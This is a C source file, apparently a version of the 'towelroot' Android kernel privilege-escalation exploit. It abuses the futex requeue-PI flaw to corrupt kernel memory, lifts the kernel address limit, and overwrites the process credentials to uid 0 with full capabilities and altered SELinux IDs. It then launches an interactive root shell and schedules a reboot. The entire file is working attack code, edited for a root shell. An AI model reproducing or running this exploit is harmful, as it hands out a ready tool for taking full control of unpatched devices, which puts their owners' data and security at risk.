#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>

#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

#define ARRAY_SIZE(a)		(sizeof (a) / sizeof (*(a)))

#define KERNEL_START		0xc0000000

#define LOCAL_PORT		5551

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;

	/* ... */
};

struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3]; 
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};

struct mmsghdr {
	struct msghdr msg_hdr;
	unsigned int  msg_len;
};

struct phonefmt {
	char *version;
	unsigned long l1;
	unsigned long l2;
	unsigned long l3;
};

struct phonefmt default_phone = {"", 0, 1, 0};
struct phonefmt new_samsung = {"Linux version 3.4.0-", 1, 1, 0x00001cd4};
struct phonefmt phones[1] = {"Linux version 3.4.0-722276", 1, 1, 0x00001cd4};
struct phonefmt *ph = &default_phone;

//bss
int _swag = 0;
int _swag2 = 0;
struct thread_info *HACKS_final_stack_base = NULL;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
volatile int do_socket_tid_read = 0;
volatile int did_socket_tid_read = 0;
volatile int do_splice_tid_read = 0;
volatile int did_splice_tid_read = 0;
volatile int do_dm_tid_read = 0;
volatile int did_dm_tid_read = 0;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int HACKS_fdm = 0;
unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
pthread_mutex_t *is_kernel_writing;
pid_t last_tid = 0;


void sub_bd38_check_kernel_version(void)
{
	char filebuf[0x1000];
	FILE *fp;
	int i;
	char *pdest;
	int foundph;
	int ret;
	int kernel_num;

	memset(filebuf, sizeof filebuf, 0);

	fp = fopen("/proc/version", "rb");
	fread(filebuf, 1, sizeof(filebuf) - 1, fp);
	fclose(fp);

	printf("got kernel version %s\n", filebuf);

	for (i = 0; i < ARRAY_SIZE(phones); i++) {
		pdest = strstr(filebuf, phones[i].version);
		if (pdest != 0) {
			printf("found matching phone: %s\n", phones[i].version);
			ph = &phones[i];
			foundph = 1;

			return;
		}
	}

	ret = memcmp(filebuf, new_samsung.version, strlen(new_samsung.version));
	if (ret == 0) {
		pdest = filebuf + strlen(new_samsung.version);
		kernel_num = atoi(pdest);
		printf("got kernel number %d\n", kernel_num);

		if (kernel_num > 951485) {
			printf("using new samsung\n");
			ph = &new_samsung;
			foundph = 1;
			return;
		}
	}

	printf("no matching phone found, trying default\n");
	foundph = 0;

	return;
}

ssize_t sub_ba44_readmem(const void *src, void *dest, size_t count)
{
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	len = write(pipefd[1], src, count);

	if (len != count) {
		printf("FAILED READ @ %p : %d %d\n", src, (int)len, errno);
		while (1) {
			sleep(10);
		}
	}

	read(pipefd[0], dest, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

ssize_t sub_b7d8_writemem(void *dest, const void *src, size_t count)
{
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	write(pipefd[1], src, count);
	len = read(pipefd[0], dest, count);

	if (len != count) {
		printf("FAILED WRITE @ %p : %d %d\n", dest, (int)len, errno);
		while (1) {
			sleep(10);
		}
	}

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

void sub_881c_get_root(int signum)
{
	struct thread_info stackbuf;
	unsigned long taskbuf[0x100];
	struct cred *cred;
	struct cred credbuf;
	struct task_security_struct *security;
	struct task_security_struct securitybuf;
	pid_t pid;
	int i;
	int ret;
	FILE *fp;

	pthread_mutex_lock(&is_thread_awake_lock);
	pthread_cond_signal(&is_thread_awake);
	pthread_mutex_unlock(&is_thread_awake_lock);

	if (HACKS_final_stack_base == NULL) {
		static unsigned long new_addr_limit = 0xffffffff;
		char *slavename;
		int pipefd[2];
		char readbuf[0x100];

		printf("cpid1 resumed\n");

		pthread_mutex_lock(is_kernel_writing);

		HACKS_fdm = open("/dev/ptmx", O_RDWR);
		unlockpt(HACKS_fdm);
		slavename = ptsname(HACKS_fdm);

		open(slavename, O_RDWR);

		if (ph->l3 != 0) {
			pipe(pipefd);

			do_splice_tid_read = 1;
			while (1) {
				if (did_splice_tid_read != 0) {
					break;
				}
			}

			syscall(__NR_splice, HACKS_fdm, NULL, pipefd[1], NULL, sizeof readbuf, 0);
		}
		else {
			do_splice_tid_read = 1;
			while (1) {
				if (did_splice_tid_read != 0) {
					break;
				}
			}

			read(HACKS_fdm, readbuf, sizeof readbuf);
		}

		sub_b7d8_writemem(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit);

		pthread_mutex_unlock(is_kernel_writing);

		while (1) {
			sleep(10);
		}
	}

	printf("cpid3 resumed\n");

	pthread_mutex_lock(is_kernel_writing);

	printf("WOOT\n");

	sub_ba44_readmem(HACKS_final_stack_base, &stackbuf, sizeof stackbuf);

	sub_ba44_readmem(stackbuf.task, taskbuf, sizeof taskbuf);

	cred = NULL;
	security = NULL;
	pid = 0;

	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		struct task_struct_partial *task = (void *)&taskbuf[i];


		if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
		 && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
		 && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
		 && task->real_cred == task->cred) {
			cred = task->cred;
			break;
		}
	}

	sub_ba44_readmem(cred, &credbuf, sizeof credbuf);

	security = credbuf.security;

	if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
		sub_ba44_readmem(security, &securitybuf, sizeof securitybuf);

		if (securitybuf.osid != 0
		 && securitybuf.sid != 0
		 && securitybuf.exec_sid == 0
		 && securitybuf.create_sid == 0
		 && securitybuf.keycreate_sid == 0
		 && securitybuf.sockcreate_sid == 0) {
			securitybuf.osid = 1;
			securitybuf.sid = 1;

			printf("YOU ARE A SCARY PHONE\n");

			sub_b7d8_writemem(security, &securitybuf, sizeof securitybuf);
		}
	}

	credbuf.uid = 0;
	credbuf.gid = 0;
	credbuf.suid = 0;
	credbuf.sgid = 0;
	credbuf.euid = 0;
	credbuf.egid = 0;
	credbuf.fsuid = 0;
	credbuf.fsgid = 0;

	credbuf.cap_inheritable.cap[0] = 0xffffffff;
	credbuf.cap_inheritable.cap[1] = 0xffffffff;
	credbuf.cap_permitted.cap[0] = 0xffffffff;
	credbuf.cap_permitted.cap[1] = 0xffffffff;
	credbuf.cap_effective.cap[0] = 0xffffffff;
	credbuf.cap_effective.cap[1] = 0xffffffff;
	credbuf.cap_bset.cap[0] = 0xffffffff;
	credbuf.cap_bset.cap[1] = 0xffffffff;

	sub_b7d8_writemem(cred, &credbuf, sizeof credbuf);

	pid = syscall(__NR_gettid);

	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		static unsigned long write_value = 1;

		if (taskbuf[i] == pid) {
			sub_b7d8_writemem(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value);

			if (getuid() != 0) {
				printf("ROOT FAILED\n");
				while (1) {
					sleep(10);
				}
			}
			else {	//rooted
				break;
			}
		}
	}

	//rooted

    // Edited by metall0id for root shell

	ret = system("/system/bin/sh -i");
	if (ret != 0) {
		printf("COMMAND FAILED\n");
		while (1) {
			sleep(10);
		}
	}

	pid = fork();
	if (pid == 0) {	//child
		printf("rebooting in 15\n");

		sleep(15);

		printf("rebooting\n");

		system("reboot");

		while (1) {
			sleep(10);
		}
	}

	pthread_mutex_lock(&done_lock);
	pthread_cond_signal(&done);
	pthread_mutex_unlock(&done_lock);

	while (1) {
		sleep(10);
	}

	return;
}

void *sub_8394(void *arg)
{
	int prio;
	struct sigaction act;
	int ret;

	prio = (int)arg;
	last_tid = syscall(__NR_gettid);

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_cond_signal(&is_thread_desched);

	act.sa_handler = sub_881c_get_root;
	act.sa_mask = 0;
	act.sa_flags = 0;
	act.sa_restorer = NULL;
	sigaction(12, &act, NULL);

	setpriority(PRIO_PROCESS, 0, prio);

	pthread_mutex_unlock(&is_thread_desched_lock);

	do_dm_tid_read = 1;

	while (did_dm_tid_read == 0) {
		;
	}

	ret = syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
	printf("futex dm: %d\n", ret);

	while (1) {
		sleep(10);
	}

	return NULL;
}

pid_t sub_7690(int prio)
{
	pthread_t th4;
	pid_t pid;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;

	do_dm_tid_read = 0;
	did_dm_tid_read = 0;

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_create(&th4, 0, sub_8394, (void *)prio);
	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

	pid = last_tid;

	sprintf(filename, "/proc/self/task/%d/status", pid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	}
	else {
		fread(filebuf, 1, sizeof filebuf, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	while (do_dm_tid_read == 0) {
		usleep(10);
	}

	did_dm_tid_read = 1;

	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);

	}

	pthread_mutex_unlock(&is_thread_desched_lock);

	return pid;
}

int sub_7390(void)
{
	int sockfd;
	struct sockaddr_in addr = {0};
	int ret;
	int sock_buf_size;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
	if (sockfd < 0) {
		printf("socket failed\n");
		usleep(10);
	}
	else {
		addr.sin_family = AF_INET;
		addr.sin_port = htons(LOCAL_PORT);
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	}

	while (1) {
		ret = connect(sockfd, (struct sockaddr *)&addr, 16);
		if (ret >= 0) {
			break;
		}
		usleep(10);
	}

	sock_buf_size = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

	return sockfd;
}

void *sub_5960(void *arg)
{
	int sockfd;
	struct mmsghdr msgvec[1];
	struct iovec msg_iov[8];
	unsigned long databuf[0x20];
	int i;
	int ret;

	waiter_thread_tid = syscall(__NR_gettid);
	setpriority(PRIO_PROCESS, 0, 12);

	sockfd = sub_7390();

	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
		databuf[i] = MAGIC;
	}

	if (ph->l2 == 0) {
		for (i = 0; i < 8; i++) {
			msg_iov[i].iov_base = (void *)MAGIC;
			msg_iov[i].iov_len = MAGIC_ALT;
		}
	}
	else {
		for (i = 0; i < 8; i++) {
			msg_iov[i].iov_base = (void *)MAGIC;
			msg_iov[i].iov_len = 0x10;
		}
	}

	msgvec[0].msg_hdr.msg_name = databuf;
	msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
	msgvec[0].msg_hdr.msg_iov = msg_iov;
	msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
	msgvec[0].msg_hdr.msg_control = databuf;
	msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
	msgvec[0].msg_hdr.msg_flags = 0;
	msgvec[0].msg_len = 0;

	syscall(__NR_futex, &_swag, FUTEX_WAIT_REQUEUE_PI, 0, 0, &_swag2, 0);

	do_socket_tid_read = 1;

	while (1) {
		if (did_socket_tid_read != 0) {
			break;
		}
	}

	ret = 0;

	switch (ph->l1) {
	case 0:
		while (1) {
			ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
			if (ret <= 0) {
				break;
			}
		}

		break;

	case 1:
		ret = syscall(__NR_recvmmsg, sockfd, msgvec, 1, 0, NULL);
		break;

	case 2:
		while (1) {
			ret = sendmsg(sockfd, &(msgvec[0].msg_hdr), 0);
			if (ret <= 0) {
				break;
			}
		}
		break;

	case 3:
		ret = recvmsg(sockfd, &(msgvec[0].msg_hdr), 0);
		break;
	}

	if (ret < 0) {
		perror("SOCKSHIT");
	}

	printf("EXIT WTF\n");

	while (1) {
		sleep(10);
	}

	return NULL;
}

static inline setup_exploit(unsigned long mem)
{
	*((unsigned long *)(mem - 0x04)) = 0x81;
	*((unsigned long *)(mem + 0x00)) = mem + 0x20;
	*((unsigned long *)(mem + 0x08)) = mem + 0x28;
	*((unsigned long *)(mem + 0x1c)) = 0x85;
	*((unsigned long *)(mem + 0x24)) = mem;
	*((unsigned long *)(mem + 0x2c)) = mem + 8;
}

void *sub_1b08(void *arg)
{
	int ret;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;
	unsigned long magicval;
	pid_t pid;
	unsigned long goodval, goodval2;
	unsigned long addr, setaddr;
	int i;
	char buf[0x1000];

	syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

	while (1) {
		ret = syscall(__NR_futex, &_swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag);
		if (ret == 1) {
			break;
		}
		usleep(10);
	}

	sub_7690(6);
	sub_7690(7);

	_swag2 = 0;
	do_socket_tid_read = 0;
	did_socket_tid_read = 0;

	syscall(__NR_futex, &_swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag2);

	while (1) {
		if (do_socket_tid_read != 0) {
			break;
		}
	}

	sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	}
	else {
		fread(filebuf, 1, sizeof filebuf, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	did_socket_tid_read = 1;

	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);
	}

	printf("starting the dangerous things\n");

	setup_exploit(MAGIC_ALT);
	setup_exploit(MAGIC);

	magicval = *((unsigned long *)MAGIC);

	sub_7690(11);

	if (*((unsigned long *)MAGIC) == magicval) {
		printf("using MAGIC_ALT\n");
		MAGIC = MAGIC_ALT;
	}

	while (1) {
		is_kernel_writing = (pthread_mutex_t *)malloc(4);
		pthread_mutex_init(is_kernel_writing, NULL);

		setup_exploit(MAGIC);

		pid = sub_7690(11);

		goodval = *((unsigned long *)MAGIC) & 0xffffe000;

		printf("%p is a good number\n", (void *)goodval);

		do_splice_tid_read = 0;
		did_splice_tid_read = 0;

		pthread_mutex_lock(&is_thread_awake_lock);

		kill(pid, 12);

		pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
		pthread_mutex_unlock(&is_thread_awake_lock);

		while (1) {
			if (do_splice_tid_read != 0) {
				break;
			}
			usleep(10);
		}

		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt = atoi(pdest);
			fclose(fp);
		}

		did_splice_tid_read = 1;

		while (1) {
			sprintf(filename, "/proc/self/task/%d/status", pid);
			fp = fopen(filename, "rb");
			if (fp == 0) {
				vcscnt2 = -1;
			}
			else {
				fread(filebuf, 1, sizeof filebuf, fp);
				pdest = strstr(filebuf, "voluntary_ctxt_switches");
				pdest += 19;
				vcscnt2 = atoi(pdest);
				fclose(fp);
			}

			if (vcscnt2 != vcscnt + 1) {
				break;
			}
			usleep(10);
		}

		goodval2 = 0;
		if (ph->l3 != 0) {
			addr = (unsigned long)mmap((unsigned long *)0xbef000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
			if (addr != 0xbef000) {
				continue;
			}

			setup_exploit(0xbeffe0);

			*((unsigned long *)0xbf0004) = 0xbef000 + ph->l3 + 1;

			*((unsigned long *)MAGIC) = 0xbf0000;

			sub_7690(10);

			goodval2 = *((unsigned long *)0x00bf0004);

			munmap((unsigned long *)0xbef000, 0x2000);

			goodval2 <<= 8;
			if (goodval2 < KERNEL_START) {

				setaddr = (goodval2 - 0x1000) & 0xfffff000;

				addr = (unsigned long)mmap((unsigned long *)setaddr, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
				if (addr != setaddr) {
					continue;
				}

				setup_exploit(goodval2 - 0x20);
				*((unsigned long *)(goodval2 + 4)) = goodval + ph->l3;
				*((unsigned long *)MAGIC) = goodval2;

				sub_7690(10);

				goodval2 = *((unsigned long *)(goodval2 + 4));

				munmap((unsigned long *)setaddr, 0x2000);
			}
		}
		else {
			setup_exploit(MAGIC);
			*((unsigned long *)(MAGIC + 0x24)) = goodval + 8;

			sub_7690(12);
			goodval2 = *((unsigned long *)(MAGIC + 0x24));
		}

		printf("%p is also a good number\n", (void *)goodval2);

		for (i = 0; i < 9; i++) {
			setup_exploit(MAGIC);

			pid = sub_7690(10);

			if (*((unsigned long *)MAGIC) < goodval2) {
				HACKS_final_stack_base = (void *)(*((unsigned long *)MAGIC) & 0xffffe000);

				pthread_mutex_lock(&is_thread_awake_lock);

				kill(pid, 12);

				pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
				pthread_mutex_unlock(&is_thread_awake_lock);

				printf("GOING\n");

				write(HACKS_fdm, buf, sizeof buf);

				while (1) {
					sleep(10);
				}
			}

		}
	}

	return NULL;
}

void *sub_189c(void *arg)
{
	int sockfd;
	int yes;
	struct sockaddr_in addr = {0};
	int ret;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

	yes = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(LOCAL_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 1);

	while(1) {
		ret = accept(sockfd, NULL, NULL);
		if (ret < 0) {
			printf("**** SOCK_PROC FAILED ****\n");
			while(1) {
				sleep(10);
			}
		}
		else {
			printf("i have a client like hookers\n");
		}
	}

	return NULL;
}

void sub_12c0_main(void)
{
	unsigned long addr;
	pthread_t th1, th2, th3;

	printf("************************\n");
	printf("native towelroot running with pid %d\n", getpid());

	sub_bd38_check_kernel_version();

	pthread_create(&th1, NULL, sub_189c, NULL);

	addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC = addr;
	if ((long)addr >= 0) {
		printf("first mmap failed?\n");
		while (1) {
			sleep(10);
		}
	}

	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC_ALT = addr;
	if (addr > 0x110000) {
		printf("second mmap failed?\n");
		while (1) {
			sleep(10);
		}
	}

	pthread_mutex_lock(&done_lock);
	pthread_create(&th2, NULL, sub_1b08, NULL);
	pthread_create(&th3, NULL, sub_5960, NULL);
	pthread_cond_wait(&done, &done_lock);
}

int main(void)
{
	sub_12c0_main();

	printf("Thank you for using towelroot!\n");

	sleep(30);

	return 0;
}
